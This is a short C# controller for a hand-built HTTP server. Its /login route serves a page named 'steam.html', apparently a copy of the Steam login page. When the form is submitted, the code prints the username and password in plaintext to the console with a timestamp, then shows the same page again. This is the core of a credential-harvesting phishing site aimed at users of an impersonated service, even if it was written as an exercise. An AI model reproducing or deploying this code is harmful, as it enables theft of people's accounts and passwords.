using System;
using System.IO;
using MyHttpServer.Framework.Attributes;

namespace MyHttpServer.Controllers
{
    [HttpController("login")]
    public class AuthController
    {
        // GET /login — отдаем HTML-страницу с формой
        [Get("")]
        public string Login()
        {
            string filePath = Path.GetFullPath(Path.Combine(
                AppContext.BaseDirectory, "..", "..", "..", "static", "steam.html"));

            if (!File.Exists(filePath))
            {
                return "<h1>Файл steam.html не найден</h1>";
            }

            return File.ReadAllText(filePath);
        }

        // POST /login — обрабатываем форму
        [Post("")]
        public string SubmitLogin(string username, string password)
        {
            Console.WriteLine("═══════════════════════════════════");
            Console.WriteLine($"  ЛОГИН:  {username}");
            Console.WriteLine($"  ПАРОЛЬ: {password}");
            Console.WriteLine($"  ВРЕМЯ:  {DateTime.Now:HH:mm:ss}");
            Console.WriteLine("═══════════════════════════════════");

            // После логина снова возвращаем страницу
            return Login();
        }
    }
}